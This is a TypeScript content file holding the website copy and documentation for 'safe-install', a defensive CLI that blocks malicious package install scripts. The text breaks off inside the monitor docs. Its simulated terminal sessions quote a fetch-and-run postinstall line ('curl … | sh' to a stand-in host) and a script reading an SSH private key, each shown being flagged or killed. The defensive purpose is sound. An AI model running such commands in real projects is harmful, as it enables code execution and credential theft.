import type { SiteContent } from './types';

/**
 * All user-facing prose, in one typed place.
 *
 * Values that are *facts* (rule IDs, exit codes, command strings) are imported
 * from `facts.ts` instead of being written here — see the JSX comments below.
 */
import { agentsCommand, distribution, globalFlags, repo } from './facts';

/** Derived from the cited module path so there is one place to change it. */
const REPO_URL = `https://${repo.value}`;
const RELEASES_URL = `${REPO_URL}/releases/latest`;
const SECURITY_URL = `${REPO_URL}/blob/main/SECURITY.md`;

export const en: SiteContent = {
  meta: {
    title: 'safe-install — Install dependencies. Not malware.',
    description:
      'safe-install is an open-source CLI that stops malicious npm, pnpm, Yarn and bun install scripts before they run. Linux, macOS and Windows. Apache-2.0.',
    ogAlt: 'safe-install — install dependencies, not malware',
  },

  nav: [
    { label: 'How it works', href: '/#how-it-works' },
    { label: 'Rules', href: '/#checks' },
    { label: 'Monitor', href: '/#monitor' },
    { label: 'CI', href: '/#ci' },
    { label: 'AI agents', href: '/#agents' },
    { label: 'Install', href: '/#install' },
    { label: 'Docs', href: '/docs/' },
  ],
  menuLabel: 'Menu',

  hero: {
    promise: 'Install dependencies. Not malware.',
    subline:
      'A drop-in replacement for npm, pnpm, Yarn and bun that installs your dependency tree with every lifecycle script switched off — then shows you the ones that wanted to run, and asks before executing a single one.',
    primaryCta: { label: 'View on GitHub', href: REPO_URL, external: true },
    secondaryCta: { label: 'How it works', href: '/#how-it-works' },

    installTabs: [
      {
        os: 'macOS',
        samples: [
          {
            label: 'Homebrew',
            lang: 'bash',
            code: `${distribution.brewTap.value}\n${distribution.brewInstall.value}`,
          },
        ],
      },
      {
        os: 'Linux',
        samples: [
          {
            label: '.deb',
            lang: 'bash',
            code: `# download the .deb from ${RELEASES_URL}\n${distribution.deb.value}`,
          },
          {
            label: 'Homebrew',
            lang: 'bash',
            code: `${distribution.brewTap.value}\n${distribution.brewInstall.value}`,
          },
        ],
      },
      {
        os: 'Windows',
        samples: [
          {
            label: 'Scoop',
            lang: 'powershell',
            code: `${distribution.scoopBucket.value}\n${distribution.scoopInstall.value}`,
          },
        ],
      },
    ],

    terminalTitle: 'zsh — ~/projects/app',
    // Illustrative session: the shape, rule IDs and commands are all real,
    // the package name and its numbers are a worked example.
    // Illustrative session in the CLI's real output format. The package name and
    // its script are a worked example; the messages, rule IDs and prompt are real.
    scenariosLabel: 'What safe-install can do',
    replayLabel: 'Replay',
    scenarios: [
      {
        id: 'install',
        label: 'Install',
        caption:
          'Scripts stay off until you say yes: a malicious postinstall is refused, esbuild is approved and remembered.',
        lines: [
          { text: '$ safe-install', tone: 'prompt' },
          {
            text: 'safe-install: using npm (package-lock.json); lifecycle scripts disabled; new versions must be 72h old',
            tone: 'muted',
          },
          { text: 'added 412 packages in 9s', tone: 'muted' },
          { text: '' },
          { text: '2 package(s) want to run install scripts.', tone: 'info' },
          { text: '' },
          { text: 'dotenv-helper@4.2.1 (direct)  risk: BLOCK', tone: 'danger' },
          { text: '  postinstall: curl -fsSL https://cdn.example.net/i.sh | sh', tone: 'muted' },
          {
            text: '  ! SI-SCR-002  postinstall script downloads and executes code',
            tone: 'danger',
          },
          { text: '  ! SI-REC-001  published 3h ago (minimum release age 3d)', tone: 'warn' },
          { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: n', tone: 'info' },
          { text: '' },
          { text: 'esbuild@0.25.10 (direct)  risk: MEDIUM', tone: 'warn' },
          { text: '  postinstall: node install.js', tone: 'muted' },
          { text: 'Run these scripts? [y]es and remember / [o]nce / [N]o: y', tone: 'info' },
          { text: 'safe-install: running approved scripts for 1 package(s)', tone: 'muted' },
          { text: '' },
          { text: '> esbuild@0.25.10 postinstall', tone: 'muted' },
          { text: '> node install.js', tone: 'muted' },
          { text: '' },
          { text: 'safe-install: ran install scripts for 1 package(s), skipped 1', tone: 'ok' },
        ],
      },
      {
        id: 'check',
        label: 'Check',
        caption:
          'Scores the lockfile without installing anything. In CI, exit code 1 fails the build. This is a real typosquat from the malware database.',
        lines: [
          { text: '$ safe-install check', tone: 'prompt' },
          { text: 'Analyzed 1 packages from package-lock.json (npm)', tone: 'muted' },
          { text: '' },
          { text: 'BLOCK  lodahs@1.0.0  (score 100, direct)', tone: 'danger' },
          {
            text: '       SI-DEP-001  version not found in the registry (unpublished?)',
            tone: 'muted',
          },
          { text: '       SI-POP-001  name looks like the popular package "lodash"', tone: 'warn' },
          {
            text: '       SI-VUL-001  GHSA-hm6q-r2jc-cpqh: lodahs is malware (high)',
            tone: 'danger',
          },
          { text: '       SI-VUL-001  known malicious package (MAL-2025-25502)', tone: 'danger' },
          { text: '' },
          { text: '1 block, 0 high, 0 medium, 0 low, 0 clean', tone: 'info' },
          { text: 'safe-install: found block-risk packages (--fail-on high)', tone: 'danger' },
        ],
      },
      {
        id: 'monitor',
        label: 'Monitor',
        caption:
          'Linux: approved scripts run under strace. With kill mode, the first high-risk action stops the script.',
        lines: [
          { text: '$ safe-install install --monitor=kill', tone: 'prompt' },
          { text: 'safe-install: running approved scripts for 1 package(s)', tone: 'muted' },
          { text: '' },
          { text: '> sketchy-sdk@2.0.1 postinstall', tone: 'muted' },
          { text: '> node setup.js', tone: 'muted' },
          { text: '' },
          {
            text: 'safe-install monitor: killed sketchy-sdk@2.0.1 postinstall: reads ~/.ssh/id_ed25519',
            tone: 'danger',
          },
          { text: '' },
          { text: 'Runtime monitor:', tone: 'info' },
          { text: '  sketchy-sdk@2.0.1 postinstall', tone: 'info' },
          { text: '    MEDIUM SI-MON-001  connects to collect.example.net:443', tone: 'warn' },
          { text: '    HIGH   SI-MON-003  reads ~/.ssh/id_ed25519  [killed]', tone: 'danger' },
        ],
      },
      {
        id: 'sandbox',
        label: 'Sandbox',
        caption:
          'Linux: approved scripts run under Landlock. Your home folder and the network are out of reach.',
        lines: [
          { text: '$ safe-install install --sandbox', tone: 'prompt' },
          {
            text: 'safe-install: sandbox: home folder hidden, writes limited to the package, node_modules, temp and caches; network blocked',
            tone: 'muted',
          },
          { text: 'safe-install: running approved scripts for 1 package(s)', tone: 'muted' },
          { text: '' },
          { text: '> esbuild@0.25.10 postinstall', tone: 'muted' },
          { text: '> node install.js', tone: 'muted' },
          { text: '' },
          { text: 'safe-install: ran install scripts for 1 package(s), skipped 0', tone: 'ok' },
        ],
      },
      {
        id: 'why',
        label: 'Why',
        caption: 'Every dependency chain that brings a package into your project.',
        lines: [
          { text: '$ safe-install why ms', tone: 'prompt' },
          { text: 'ms@2.1.3', tone: 'info' },
          { text: '  your project › express@5.2.1 › debug@4.4.3 › ms@2.1.3', tone: 'muted' },
          { text: '  your project › express@5.2.1 › send@1.2.1 › ms@2.1.3', tone: 'muted' },
        ],
      },
      {
        id: 'refuse',
        label: 'Refuse',
        caption:
          'Use it in place of npm: commands that would run unreviewed code are refused, with what to do instead.',
        lines: [
          { text: '$ safe-install exec foo', tone: 'prompt' },
          {
            text: 'safe-install: not passing "exec foo" to your package manager: it downloads and runs a package with no review. If you are sure, run it with the package manager directly (add --ignore-scripts where it installs), then run safe-install to review any new install scripts',
            tone: 'danger',
          },
        ],
      },
    ],
    footnote:
      'Output copied from the real CLI. dotenv-helper and sketchy-sdk are made-up examples; lodahs is real malware from the OSV database.',
  },

  problem: {
    eyebrow: 'The problem',
    heading: 'Installing a dependency is running code.',
    lede: 'Most people picture `npm install` as downloading files. For a large part of the ecosystem, it is also executing them — and it does so for packages you never typed, deep in a tree you never read.',
    points: [
      {
        title: 'Three fields, unlimited reach',
        body: '`preinstall`, `install` and `postinstall` run automatically. Any package in the tree can declare them, including packages that arrived as a transitive dependency of something you did ask for.',
      },
      {
        title: 'A compromised maintainer is enough',
        body: 'The package you have used for years publishes a normal-looking version. Its install script now phones home. You did not change anything, and the lockfile diff looks like a version bump.',
      },
      {
        title: 'Reviewing every script is not a strategy',
        body: 'A real application pulls hundreds of packages. Auditing each install script by hand does not scale, so in practice nobody does — which is exactly the gap attackers aim for.',
      },
    ],
    kicker: 'safe-install closes that door by default, and opens it only for scripts you approved.',
  },

  howItWorks: {
    eyebrow: 'How it works',
    heading: 'Control first. Observe second.',
    lede: 'Downloading and extracting a tarball is harmless. Executing it is not. safe-install separates the two, which is why the same approach works identically on Linux, macOS and Windows.',
    steps: [
      {
        id: 'install',
        title: 'Install',
        body: 'Run your package manager with every lifecycle script disabled, your project’s own included. Tarballs are downloaded and extracted as usual, minus the code execution.',
      },
      {
        id: 'analyze',
        title: 'Analyze',
        body: 'Read the lockfile for the whole tree, find every installed package that wants to run a script, and score it: the script and the file it runs, plus registry, provenance and malware-database checks. `safe-install check` scores the entire tree without installing.',
      },
      {
        id: 'inspect',
        title: 'Inspect',
        body: 'Show each script with the rules it trips and the evidence behind them, so you decide with the code in front of you.',
      },
      {
        id: 'approve',
        title: 'Approve',
        body: 'Approve per package, interactively or through a `.safe-install.json` your team commits. Approvals pin to a hash of the scripts and the files they run, so a changed script asks again.',
      },
      {
        id: 'run',
        title: 'Run',
        body: 'Run only the approved scripts, dependencies first, with `npm run <stage>` in each package’s directory. On Linux, optionally under the runtime monitor.',
      },
    ],
    note: 'Every step is a plain CLI invocation: nothing is left running afterwards, and only registry metadata is cached between runs.',
  },

  agents: {
    eyebrow: 'AI coding agents',
    heading: 'Your agent installs packages too.',
    lede: 'Claude Code, Codex, Cursor and friends run npm install all day, and they should not decide which install scripts get to run. Give them these instructions: they install through safe-install, never approve a script themselves, and bring the decision back to you.',
    rules: [
      'Installs and adds go through safe-install, never npm directly.',
      'Never approve scripts, never --force or --yes, never edit allowScripts.',
      'Skipped scripts are reported to you, with the command to approve them yourself.',
      'Refused commands and high-risk findings stop the agent instead of being worked around.',
    ],
    commandHeading: 'Add them to your project',
    command: agentsCommand.value,
    commandNote:
      'Or CLAUDE.md, .cursorrules, or wherever your agent reads its instructions. The text matches the safe-install version you run.',
    promptLabel: 'safe-install llm',
    copyLabel: 'Copy prompt',
    llmsTxtNote: 'the same text, for agents that fetch docs from the web.',
  },

  checks: {
    eyebrow: 'What it checks',
    heading: 'Twenty-two rules, nine questions.',
    lede: 'Every finding carries a rule ID, a severity and the evidence that triggered it — so you can look up exactly why something was flagged and decide for yourself.',
    families: [
      {
        id: 'scripts',
        title: 'What does the script actually do?',
        blurb: 'The script itself is the attack surface, so its contents are read and inspected.',
      },
      {
        id: 'recency',
        title: 'Did something just change hands?',
        blurb:
          'Brand-new releases and sudden maintainer changes are where most hijacks show up first.',
      },
      {
        id: 'popularity',
        title: 'Is this name real, or is it a typo?',
        blurb:
          'Names close to popular packages and packages nobody has heard of both get a second look.',
      },
      {
        id: 'integrity',
        title: 'Does the bytes match the promise?',
        blurb:
          'The lockfile’s integrity hash and the resolved URL are checked against the registry.',
      },
      {
        id: 'maintenance',
        title: 'Is this package still maintained?',
        blurb:
          'Deprecated packages and versions that have been unpublished are surfaced rather than silently installed.',
      },
      {
        id: 'policy',
        title: 'Has your organization banned it?',
        blurb:
          'Packages matching a blockPackages pattern, in your project or your organization’s shared policy, are blocked.',
      },
      {
        id: 'vulns',
        title: 'Is this a known-bad version?',
        blurb:
          'Every resolved version is looked up in OSV. Known malware blocks outright; ordinary vulnerabilities are reported one level below their advisory severity.',
      },
      {
        id: 'code',
        title: 'What does the rest of the code do?',
        blurb:
          'Malware also hides in the code a package loads, not just its install scripts. scan reads installed packages, and check --deep downloads and reads the ones a pull request adds.',
      },
      {
        id: 'monitor',
        title: 'What did the script actually do? (Linux)',
        blurb:
          'With --monitor, approved scripts run under strace and their network, credential and persistence behaviour is reported, or stopped.',
      },
    ],
    severities: [
      { id: 'block', label: 'Block', description: 'Blocked outright, whatever the total score.' },
      {
        id: 'high',
        label: 'High',
        description: 'Counts toward the risk score and fails a CI run by default.',
      },
      { id: 'medium', label: 'Medium', description: 'Counts toward the risk score.' },
      { id: 'low', label: 'Low', description: 'Reported for information.' },
      {
        id: 'advisory',
        label: 'Per advisory',
        description:
          'Malware entries block; other advisories count one level below their severity.',
      },
    ],
    scoringNote:
      'Scores are a weighted sum capped at 100: below 30 is low, 30–59 is medium, 60 and above is high.',
    explainNote: 'Not sure what a rule means? `safe-install explain SI-SCR-002` tells you.',
    releaseAgeGate: {
      heading: 'It does not just warn about fresh versions. It refuses them.',
      body: 'A hijacked package needs a freshly published release, and most are caught and unpublished within days. So rather than only flagging a version published three hours ago, safe-install asks your package manager to skip anything younger than minReleaseAge (72h by default). The bad release never lands.',
      native:
        'safe-install passes the age to your package manager’s own setting, so new resolutions skip versions younger than minReleaseAge. Versions already in your lockfile are kept, and `check` flags them.',
      fallback:
        'Yarn classic has no such setting. There, install says so, and `safe-install check` still flags every fresh version as SI-REC-001.',
      override:
        'minReleaseAgeExclude exempts packages you trust to move fast from the findings, --min-age overrides the age for one run, and --min-age 0 turns it off.',
      credit: 'The idea is borrowed from safe-npm.',
    },
  },

  packageManagers: {
    eyebrow: 'Works with your package manager',
    heading: 'One interface, five adapters.',
    lede: 'safe-install does not reimplement npm. It drives whichever package manager your project already uses, with scripts switched off, then runs exactly the approved lifecycle stages itself, the same way for all five.',
    columns: [
      { key: 'name', label: 'Package manager' },
      { key: 'lockfile', label: 'Lockfile' },
      { key: 'disableScripts', label: 'Scripts disabled' },
      { key: 'runApproved', label: 'Run approved' },
    ],
    detectionNote:
      'Detected automatically from the lockfile, then the `packageManager` field in `package.json`; `--pm` overrides both. A pinned pnpm or Yarn version runs through corepack, so you get exactly that version.',
  },

  whyGo: {
    eyebrow: 'Why Go?',
    heading: 'The boring language, on purpose.',
    lede: 'A security tool should not be interesting. It should start instantly, run on a machine with nothing installed, and be simple enough to audit. Go was the choice that made all three cheap.',
    reasons: [
      {
        title: 'One static binary per OS and architecture',
        body: 'No runtime and no package manager on the target machine. A single file of under 10 MB runs the same on a developer laptop, a locked-down CI runner and a production container.',
      },
      {
        title: 'Cross-compilation is not a project',
        body: 'Building all of Linux, macOS and Windows across amd64 and arm64 is one GoReleaser config and one CI workflow. Most projects treat multi-platform binaries as a reason to pick a different language.',
      },
      {
        title: 'Concurrent registry lookups without ceremony',
        body: 'Analyzing a few hundred packages means a few hundred registry requests. Go’s runtime makes that a loop over goroutines with a shared cache, not an async framework.',
      },
      {
        title: 'It shares an ecosystem with tools you already trust',
        body: 'osv-scanner, trivy and grype are all Go. The advisory databases, the scanning patterns and the prior art are already written in the same language, in projects with comparable threat models.',
      },
      {
        title: 'Few dependencies, on purpose',
        body: 'Two direct dependencies: cobra for the CLI and go-yaml for pnpm and Yarn lockfiles. A tool that asks you to trust it with your supply chain should not also ask you to trust forty transitive packages.',
      },
    ],
    comparisonHeading: 'The honest version',
    comparisonRows: [
      {
        language: 'Go',
        verdict: 'Shipped',
        note: 'Single static binary, trivial cross-compilation, and a security tooling ecosystem to borrow from.',
      },
      {
        language: 'Rust',
        verdict: 'A close second',
        note: 'Would give the same single binary and arguably better guarantees, but a smaller security-tool ecosystem and a longer path to shipping everywhere at once.',
      },
      {
        language: 'Node / TypeScript',
        verdict: 'The wrong shape',
        note: 'Natural for a JavaScript tool, and the worst option here: it would ship through npm — the exact channel this tool exists to protect — and force a runtime install on every user.',
      },
    ],
    notViaNpmHeading: 'Deliberately not distributed via npm',
    notViaNpmBody:
      'A supply-chain security tool installed through the supply chain it protects is a weak story. If you install safe-install from npm, a compromised npm can hand you a compromised safe-install — and the one tool you were relying on is the thing that got through. Homebrew, Scoop and signed release artifacts instead.',
    releaseHeading: 'Signed, and reproducible',
    releaseBody:
      'Releases are built by GoReleaser in GitHub Actions with -trimpath and fixed timestamps, ship SBOMs, sign checksums.txt with cosign keyless signing, and carry SLSA build provenance you can check with gh attestation verify.',
  },

  monitor: {
    eyebrow: 'Linux only — the runtime monitor',
    heading: 'Watch what the approved script actually does.',
    lede: 'Static analysis tells you what a script is written to do. The runtime monitor tells you what it did. On approved scripts, safe-install can observe them live and report — or kill — anything suspicious.',
    howHeading: 'strace, scoped to the script',
    backendBody:
      'safe-install hands itself to npm as the script shell and runs each approved script under strace -f. Only the script and its children are traced, never the package manager, and no root is needed. Without strace installed, --monitor says so instead of pretending to watch.',
    signalsHeading: 'What it watches for',
    actionHeading: 'Report, or kill',
    actionBody:
      'By default the monitor only reports. With --monitor=kill, the first high-severity event kills the script’s process group. strace sees a syscall once it has happened, so that first action is not prevented; everything after it is. To prevent it, --sandbox runs approved scripts under Landlock: no home folder, and no network unless you allow it.',
    copy: {
      neutral: 'Checking your platform…',
      roasts: {
        windows: {
          headline: "Want this too? Too bad, you're on Windows.",
          jabs: [
            'Your antivirus is busy scanning `node_modules` anyway. Give it a moment… or a week.',
            'It would have to be a third-party ETW provider, and the signing process alone is a rite of passage.',
          ],
          cta: "Dual-boot. We'll wait.",
        },
        macos: {
          headline: "Want this too? Too bad, you're on a Mac.",
          jabs: [
            'Endpoint Security entitlements cost more than your dongles.',
            'System Extensions need a full install, a user prompt, and a notarization ticket — a lot of ceremony for a curl|sh detector.',
          ],
          cta: "There's a VM for that.",
        },
        linux: {
          headline: "You're on Linux. Of course it works.",
          jabs: [
            'strace is one package away, and ptrace has been in your kernel since before npm existed.',
          ],
          isSmug: true,
        },
        unknown: {
          headline: 'We could not tell what you are running.',
          jabs: [
            'Your user agent gave nothing away, which honestly is its own kind of security posture.',
          ],
        },
      },
      honest: 'Everything else in safe-install works the same on all three.',
    },
  },

  ci: {
    eyebrow: 'CI',
    heading: 'Fail the build, not your afternoon.',
    lede: 'In CI, safe-install runs non-interactively: no prompts, a machine-readable report, and an exit code your pipeline can branch on. On pull requests, the Action checks only what the PR changes and can post a short summary as a comment.',
    commandHeading: 'Or run it yourself',
    command: 'safe-install check --fail-on high --sarif-file results.sarif',
    exitCodesHeading: 'Exit codes',
    exitCodesNote:
      'Stable contract for pipelines. Declining a prompt is not an error: that script is skipped.',
    workflowTitle: 'The GitHub Action',
    workflow: {
      label: 'workflow step',
      lang: 'yaml',
      code: distribution.action.value,
    },
    flagNote: `Also available: ${globalFlags.value.join(' · ')}`,
  },

  install: {
    eyebrow: 'Install',
    heading: 'Get the binary.',
    lede: 'One static binary per platform, published as a signed release artifact. Pick whichever channel matches how you already manage machines.',
    methods: [
      {
        id: 'homebrew',
        title: 'Homebrew',
        summary:
          'macOS and Linux. The tap is this repository. On macOS, the cask prints the one-line command to clear the quarantine flag, since the binary is not notarized yet.',
        samples: [
          {
            label: 'brew',
            lang: 'bash',
            code: `${distribution.brewTap.value}\n${distribution.brewInstall.value}`,
          },
        ],
      },
      {
        id: 'scoop',
        title: 'Scoop',
        summary: 'Windows. The bucket is this repository.',
        samples: [
          {
            label: 'powershell',
            lang: 'powershell',
            code: `${distribution.scoopBucket.value}\n${distribution.scoopInstall.value}`,
          },
        ],
      },
      {
        id: 'packages',
        title: '.deb, .rpm and .apk',
        summary: 'Linux packages from the latest release; they recommend strace for --monitor.',
        samples: [
          {
            label: 'Debian / Ubuntu',
            lang: 'bash',
            code: `# download the .deb from ${RELEASES_URL}\n${distribution.deb.value}`,
          },
          { label: 'from source', lang: 'bash', code: distribution.goInstall.value },
        ],
      },
      {
        id: 'verify',
        title: 'Verify a download',
        summary:
          'checksums.txt is signed with Sigstore (keyless, bound to the release workflow) and every artifact carries SLSA build provenance.',
        samples: [{ label: 'verify', lang: 'bash', code: distribution.verify.value }],
      },
    ],
    dropInNote:
      'There is deliberately no npm package. A supply-chain security tool installed through the channel it protects is a weak story — Homebrew, Scoop and signed binaries instead.',
  },

  docs: {
    navLabel: 'Docs',
    sourceLabel: 'from the CLI',
    editLabel: 'Something wrong? Open an issue',
    index: {
      title: 'Documentation',
      description:
        'How to install, run, configure and automate safe-install. Every command on these pages is copied from the CLI’s own README.',
      sections: [],
    },
    gettingStarted: {
      title: 'Getting started',
      description: 'Install the binary, verify it, and run it in a project.',
      sections: [
        {
          id: 'install',
          title: 'Install',
          body: [
            'safe-install is one static binary per platform. Homebrew and Scoop install it from this repository, the Linux packages come from the latest release, and `go install` builds it from source.',
            'It is deliberately not published to npm: a supply-chain tool should not arrive through the channel it protects.',
          ],
        },
        {
          id: 'verify',
          title: 'Verify a download',
          body: [
            '`checksums.txt` is signed with Sigstore, keyless and bound to the repository’s release workflow, and every artifact carries SLSA build provenance. Check both before you run a downloaded binary.',
          ],
        },
        {
          id: 'first-run',
          title: 'First run',
          body: [
            'In a project with a `package.json`, run `safe-install`. It detects your package manager, installs with every lifecycle script switched off, then asks about each package that wants to run one.',
            'Answer `y` for packages you trust, such as esbuild or sharp. Your answers are saved to `.safe-install.json`; commit it so your team and CI share them.',
          ],
        },
      ],
    },
    usage: {
      title: 'Usage',
      description:
        'Installing and adding packages, the approval prompt, and the commands that manage scripts.',
      sections: [
        {
          id: 'install',
          title: 'Install and add',
          body: [
            '`safe-install` (or `safe-install install`) installs what your lockfile describes; `safe-install add` adds packages. Flags after `--` go to your package manager.',
          ],
        },
        {
          id: 'flow',
          title: 'What happens',
          body: [
            'Your package manager installs with lifecycle scripts disabled, your project’s own included. safe-install then reads every installed `package.json`, finds the packages with `preinstall`, `install` or `postinstall` scripts (or a `binding.gyp`), and scans each script and the file it runs, together with registry and malware-database checks.',
            'Approved scripts run dependencies first, with `npm run <stage>` inside each package’s directory, so npm must be on your PATH. Your project’s own lifecycle scripts are never run for you: safe-install prints which ones it skipped.',
          ],
        },
        {
          id: 'prompt',
          title: 'The prompt',
          body: [
            'For each package that is not approved yet, safe-install shows the scripts and every finding, then asks:',
          ],
        },
        {
          id: 'modes',
          title: 'Terminal, --yes and CI',
          body: [
            'Recorded approvals always apply. What happens to the others depends on how safe-install runs:',
          ],
        },
        {
          id: 'package-managers',
          title: 'Package managers',
          body: [],
        },
        {
          id: 'commands',
          title: 'Managing scripts',
          body: [
            '`safe-install scripts` lists installed packages with scripts and their approval state. `safe-install approve` records an approval and runs the scripts; high or blocking risk needs `--force`.',
            '`safe-install why` shows the dependency chains that bring a package in, `safe-install scan` scans the code of installed packages, and `safe-install cache` shows or empties the cache.',
          ],
        },
        {
          id: 'passthrough',
          title: 'Use it instead of your package manager',
          body: [
            'Commands that run no dependency code go straight to your package manager, with its output and exit code: your own scripts (`safe-install run build`, `test`, `start`) and read-only or publishing commands such as `ls`, `outdated`, `view`, `audit` and `publish`.',
            'Install verbs (`i`, `install`, `add`, `ci`) take safe-install’s reviewed path, and `uninstall` runs with install scripts forced off. Everything else is refused with what to do instead, including `update`, `rebuild`, `exec`, `dlx`, `create`, `audit fix`, `init <initializer>` and any command safe-install does not know.',
          ],
        },
        {
          id: 'shell-init',
          title: 'Use it every time',
          body: [
            '`safe-install shell-init` prints shell functions that send `npm install`, `pnpm add`, `yarn`, `bun i` and friends through safe-install. It changes nothing on its own; add the line yourself.',
          ],
        },
      ],
      answers: [
        { key: 'y', meaning: 'Run the scripts and record the approval in .safe-install.json.' },
        { key: 'o', meaning: 'Run them this once, without recording anything.' },
        { key: 'N (default)', meaning: 'Skip them. The package may not work until they run.' },
      ],
      modes: [
        { when: 'In a terminal', what: 'You are asked about each package.' },
        {
          when: 'With --yes',
          what: 'Packages below high risk are approved for this run, without being recorded.',
        },
        {
          when: 'Without a terminal, or with --ci',
          what: 'Nothing new is approved. With --ci, an unapproved high-risk script exits with 1.',
        },
      ],
    },
    policy: {
      title: 'Policy and approvals',
      description: 'The .safe-install.json file, how approvals work, and the release-age gate.',
      sections: [
        {
          id: 'file',
          title: 'The policy file',
          body: [
            'Approvals and settings live in `.safe-install.json` at the root of your project. Commit it: your team and your CI then share one set of reviewed scripts.',
          ],
        },
        {
          id: 'fields',
          title: 'Fields',
          body: [],
        },
        {
          id: 'approvals',
          title: 'Approvals are pinned to content',
          body: [
            'An approval stores a hash of each script command and of the files those commands run with node. A version bump that leaves the scripts unchanged stays approved.',
            'If the scripts or those files change, safe-install reports `SI-SCR-005`, does not run them, and asks again. That covers the common attack where `install.js` changes while the command stays `node install.js`.',
          ],
        },
        {
          id: 'trust',
          title: 'Trust provenance, or expire',
          body: [
            'With `--trust provenance`, changed scripts are still accepted when the new version carries npm provenance from the repository recorded at approval time. A release published by hand, for example with a stolen token, or built from another repository is not. Globs such as `@corp/*` are allowed only with provenance. safe-install reads the provenance the registry serves; it does not re-verify its Sigstore signature.',
            '`--expires 90d` (or a date) makes an approval lapse, so it is reviewed again.',
          ],
        },
        {
          id: 'org',
          title: 'Organization policy',
          body: [
            'A security team can publish one policy for every repository: the same format plus `blockPackages`, name globs that must never be used. Point safe-install at it with `SAFE_INSTALL_ORG_POLICY` or `orgPolicy` in your user config, which win, or in `.safe-install.json`.',
            'Projects build on it but cannot weaken it: blocked packages are reported as `SI-POL-001` and their scripts never run, and `minReleaseAge` and `failOn` are at least as strict as the organization’s. The policy must be https. If it cannot be fetched, the last cached copy is used with a warning; with no cache, safe-install stops. `SAFE_INSTALL_ORG_POLICY_TOKEN` is sent only to the policy’s host, and never to a URL named by a project file.',
          ],
        },
        {
          id: 'locations',
          title: 'Project and user files',
          body: [
            'A user-wide file with the same format applies to every project (`safe-install approve --global` writes to it). The project file wins on conflicts, and command-line flags win over both.',
          ],
        },
        {
          id: 'release-age',
          title: 'Release-age gate',
          body: [
            '`minReleaseAge` (or `--min-age`, default `72h`) is passed to your package manager’s own setting, so new resolutions skip younger versions: npm `--before`, pnpm `minimumReleaseAge`, Yarn berry `npmMinimalAgeGate`, bun `--minimum-release-age`. Yarn classic has none; `safe-install check` still flags fresh versions there.',
            '`minReleaseAgeExclude` exempts packages from the findings only: the age handed to the package manager applies to every package.',
          ],
        },
      ],
      fields: [
        {
          name: 'allowScripts',
          meaning:
            'Approvals by package name (or glob): version reviewed, content hash, date, and optionally trust, repository and expires.',
        },
        {
          name: 'minReleaseAge',
          meaning: 'Minimum age of new versions, e.g. 72h or 3d; 0 disables.',
        },
        {
          name: 'minReleaseAgeExclude',
          meaning: 'Package name globs exempt from release-age findings, e.g. @types/*.',
        },
        {
          name: 'failOn',
          meaning: 'The level at which check exits 1: low, medium, high, block or none.',
        },
        {
          name: 'blockPackages',
          meaning: 'Package name globs that are always blocked (SI-POL-001).',
        },
        {
          name: 'orgPolicy',
          meaning: 'Path or https URL of an organization policy to build on.',
        },
      ],
      locations: [
        { where: 'Project', path: '.safe-install.json' },
        { where: 'User, Linux', path: '~/.config/safe-install/config.json' },
        { where: 'User, macOS', path: '~/Library/Application Support/safe-install/config.json' },
        { where: 'User, Windows', path: '%AppData%\\safe-install\\config.json' },
      ],
    },
    checkAndCi: {
      title: 'Check and CI',
      description: 'Score a lockfile without installing, and fail pipelines on risky dependencies.',
      sections: [
        {
          id: 'check',
          title: 'safe-install check',
          body: [
            '`check` scores every package in the lockfile without installing anything: release age, publisher and provenance changes, integrity, typosquats, rarely used packages with install scripts, and the OSV database. Output is text, JSON, SARIF or Markdown, and `--summary-file` writes a short Markdown summary alongside.',
            '`--diff` checks only the packages that are new or changed since a git ref or an old lockfile, and `--deep` also downloads those packages, verifies them against the lockfile’s integrity hash and scans their code in memory.',
            'It talks to your registry, to OSV (package names and versions) and to npm’s download counts API for rarely used packages with scripts. `--offline` uses cached registry data only and skips both.',
          ],
        },
        {
          id: 'code-scan',
          title: 'Code scanning',
          body: [
            'Install scripts are not the only way in: code can also run when your app imports a package. Every install, `safe-install scan` and `check --deep` scan each package’s JavaScript for code that downloads and executes (`SI-CODE-001`), reads credentials next to a network send (`SI-CODE-002`), or is obfuscated (`SI-CODE-003`). Results are cached per package version, and files over 2 MB are skipped.',
          ],
        },
        {
          id: 'exit-codes',
          title: 'Exit codes',
          body: [],
        },
        {
          id: 'action',
          title: 'GitHub Action',
          body: [
            'The action downloads the release binary for the runner, verifies its checksum, runs `check`, and fails the job when a package reaches `fail-on`. On pull requests it checks only the packages the PR adds or upgrades and scans their code. With `sarif: true`, findings appear in code scanning, pointing at the lockfile line.',
            'A short summary goes to the job summary on every run. With `comment: true`, the action also posts it on the pull request when something is risky, and edits that one comment on later runs. Package names and messages are shown as code, so a package cannot put links or mentions in it.',
          ],
        },
        {
          id: 'registries',
          title: 'Private registries',
          body: [
            'safe-install reads registries and credentials where your package manager does: `.npmrc` (project and user), `.yarnrc.yml` and `npm_config_registry`. Scoped registries and per-host credentials are supported. A credential is sent only to the registry it is configured for, never to OSV or npm’s download counts, and never printed.',
          ],
        },
        {
          id: 'cache',
          title: 'Cache',
          body: [
            'Registry metadata, code-scan results and the organization policy are cached in `safe-install cache dir` (`SAFE_INSTALL_CACHE_DIR` moves it). The cache is capped at 1 GB (`SAFE_INSTALL_CACHE_MAX`), and the least recently used files are removed once it is over. `safe-install cache clean` empties it.',
          ],
        },
      ],
      inputs: [
        {
          name: 'working-directory',
          meaning: 'Where package.json and the lockfile are. Default .',
        },
        { name: 'fail-on', meaning: 'low, medium, high, block or none. Default high.' },
        {
          name: 'min-age',
          meaning: 'Minimum release age, e.g. 72h or 3d; 0 disables. Default 72h.',
        },
        {
          name: 'sarif',
          meaning: 'Upload results to code scanning; needs security-events: write. Default false.',
        },
        {
          name: 'diff',
          meaning:
            'auto: on pull requests, only packages new or changed versus the base branch; none: all; or a git ref. Default auto.',
        },
        {
          name: 'deep',
          meaning:
            'Also download and scan the checked packages’ code: auto (when diff applies), true or false.',
        },
        {
          name: 'comment',
          meaning:
            'Post the summary on the pull request; needs pull-requests: write. Default false.',
        },
        {
          name: 'version',
          meaning: 'latest, a tag like v0.1.0, or source to build from the action’s checkout.',
        },
      ],
    },
    monitor: {
      title: 'Monitor and sandbox',
      description: 'Watch approved install scripts as they run, or lock them in, on Linux.',
      sections: [
        {
          id: 'how',
          title: 'How it works',
          body: [
            'With `--monitor`, safe-install hands itself to npm as the script shell and runs each approved script under `strace -f`. Only the script and its children are traced, never the package manager, so npm reading its own `.npmrc` is not a false alarm. No root is needed; install `strace` with your package manager.',
